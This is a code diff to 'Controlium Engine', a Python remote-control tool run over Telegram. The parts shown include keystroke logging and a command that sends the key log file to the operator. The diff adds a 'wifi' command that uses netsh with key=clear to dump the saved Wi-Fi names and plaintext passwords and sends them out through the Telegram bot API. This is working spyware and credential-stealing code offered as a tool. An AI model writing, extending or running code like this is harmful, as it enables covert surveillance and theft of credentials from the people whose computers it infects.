@@ -1,4 +1,5 @@
 import os
+import re
 import time
 import uuid
 import logging
@@ -25,11 +26,11 @@ import screen_brightness_control as scrn
 from scipy.io.wavfile import write
 
 
-BOT_TOKEN = "YOUR TOKEN"
+BOT_TOKEN = "YOUR BOT TOKEN"
 
 def telegram_alert(send):
     bot_token = BOT_TOKEN
-    my_chatID = "CHAT ID"
+    my_chatID = "YOUR CHAT ID"
     send_text = "https://api.telegram.org/bot" + bot_token + "/sendMessage?chat_id=" + my_chatID + "&parse_mode=Markdown&text=" + send
 
     response = requests.get(send_text)
@@ -61,7 +62,7 @@ def command_unit(message):
             except Exception as e:
                 bot.reply_to(message, f"Error sending file: {e}")
 
-        elif message.text.lower() == "/keylog":
+        elif message.text.lower() == "/keylg":
             try:
                 with open(key_log_file, 'rb') as file:
                     bot.send_document(message.chat.id, file)
@@ -321,6 +322,36 @@ def command_unit(message):
             speech_engine(f"The time is {time}")
             bot.reply_to(message, "Done")
 
+
+        elif "wifi" in message.text.lower():
+            try:
+                command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True).stdout.decode()
+                profile_names = re.findall("All User Profile     : (.*)\r", command_output)
+                wifi_list = []
+
+                if profile_names:
+                    for name in profile_names:
+                        wifi_profile = {}
+                        profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name], capture_output=True).stdout.decode()
+
+                        if "Security key           : Absent" in profile_info:
+                            continue
+
+                        wifi_profile["ssid"] = name
+                        profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output=True).stdout.decode()
+                        password = re.search("Key Content            : (.*)\r", profile_info_pass)
+
+                        wifi_profile["password"] = password[1] if password else None
+                        wifi_list.append(wifi_profile)
+
+                for wifi in wifi_list:
+                    message_text = f"SSID: {wifi['ssid']}\nPassword: {wifi['password'] or 'None'}"
+                    telegram_alert(message_text)
+
+            except Exception as e:
+                bot.reply_to(message, f"ERROR >> {e}")
+
+
         elif "search" in message.text.lower():
             indx = message.text.lower().split().index("search")
             conv = message.text.split()[indx + 1:]
@@ -329,7 +360,7 @@ def command_unit(message):
             bot.reply_to(message, f"Searching {query}")
 
         elif message.text.lower() == "/version":
-            bot.reply_to(message, "Controlium Engine v1.6.2")
+            bot.reply_to(message, "Controlium Engine v1.6.3")
 
         else:
             bot.reply_to(message, "Invalid command")
@@ -409,7 +440,7 @@ def key_release(key):
 def keystroke_logger():
     time_stamp = datetime.datetime.now().strftime("%D:%h:%H:%M:%S")
     with open(key_log_file, "a") as f:
-        f.write(f'''CONTROLIUM ENGINE v1.6.2
+        f.write(f'''CONTROLIUM ENGINE v1.6.3
 {str(time_stamp)}
 << KEYSTROKE LOG >>
 
@@ -429,7 +460,7 @@ def keystroke_logger():
 
 def activity_logger():
     time_stamp = datetime.datetime.now().strftime("%D:%h:%H:%M:%S")
-    logging.info(f'''CONTROLIUM ENGINE v1.6.2
+    logging.info(f'''CONTROLIUM ENGINE v1.6.3
 {str(time_stamp)}
 << ACTIVITY LOG >>
 
@@ -538,7 +569,7 @@ if __name__ == "__main__":
 
 
 # MIT License
-# Copyright (c) 2024 Ashfaaq Rifath - Controlium Engine v1.6.2
+# Copyright (c) 2025 Ashfaaq Rifath - Controlium Engine v1.6.3
 # All rights reserved.
 
 # USE WITH CAUSION
